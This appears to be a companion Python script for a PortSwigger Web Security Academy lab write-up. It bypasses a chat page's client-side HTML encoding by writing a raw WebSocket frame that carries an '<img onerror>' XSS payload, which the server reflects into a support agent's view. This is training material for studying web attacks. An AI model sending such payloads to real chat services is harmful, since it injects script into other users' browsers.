#!/usr/bin/env python3
"""
Manipulating WebSocket messages to exploit vulnerabilities
PortSwigger Web Security Academy -- WebSockets

Companion script for the writeup: 01-manipulating-websocket-messages.md

What this does:
    Connects straight to the chat WebSocket endpoint from Python instead of
    typing into the browser's chat box. The page's own JavaScript HTML-encodes
    outgoing messages before calling send() -- but that encoding only runs
    inside that specific JS. A client that speaks the WebSocket protocol
    directly writes the JSON frame itself, with no encoding step in between.
    Sends the raw <img onerror> payload as the "message" value; the server
    reflects it unmodified into the support agent's view, and the browser on
    the receiving end fires the handler.

Usage:
    python 01-manipulating-websocket-messages.py <lab-url>
    e.g. python 01-manipulating-websocket-messages.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx websockets
"""

import asyncio
import re
import sys
from urllib.parse import urlparse

import httpx
import websockets

XSS_PAYLOAD = "<img src=1 onerror='alert(1)'>"


async def discover_ws_url(lab_url: str) -> str:
    """Find the chat WebSocket endpoint the same way the page's own script constructs it."""
    host = urlparse(lab_url).hostname
    scheme = "wss" if lab_url.startswith("https") else "ws"

    async with httpx.AsyncClient(verify=False, follow_redirects=True) as client:
        r = await client.get(lab_url)

    found = re.findall(r"""new\s+WebSocket\s*\(\s*['"`](wss?://[^'"`]+)['"`]\s*\)""", r.text)
    for url in found:
        if host in url:
            return url

    guess = f"{scheme}://{host}/chat"
    print(f"  [*] No WebSocket URL in page source, guessing: {guess}")
    return guess


async def solve(lab_url: str) -> None:
    ws_url = await discover_ws_url(lab_url)
    print(f"[*] WebSocket endpoint: {ws_url}")

    print("[*] Opening a raw WebSocket connection and writing the JSON frame directly "
          "-- bypassing the chat box's HTML-encoding JS entirely...")
    async with websockets.connect(ws_url, open_timeout=10) as ws:
        await ws.send('{"message":"%s"}' % XSS_PAYLOAD)
        try:
            response = await asyncio.wait_for(ws.recv(), timeout=5)
            print(f"[*] Server echoed back: {response[:200]}")
        except asyncio.TimeoutError:
            print("[*] No response frame on this socket (the message goes to the agent's view, not back to us).")

    await asyncio.sleep(3)  # give the simulated support agent time to render the message

    async with httpx.AsyncClient(verify=False) as client:
        check = await client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- alert(1) fired in the support agent's browser.")
    else:
        print("[-] Not solved yet -- confirm the WebSocket endpoint path and retry.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    asyncio.run(solve(sys.argv[1].rstrip("/")))
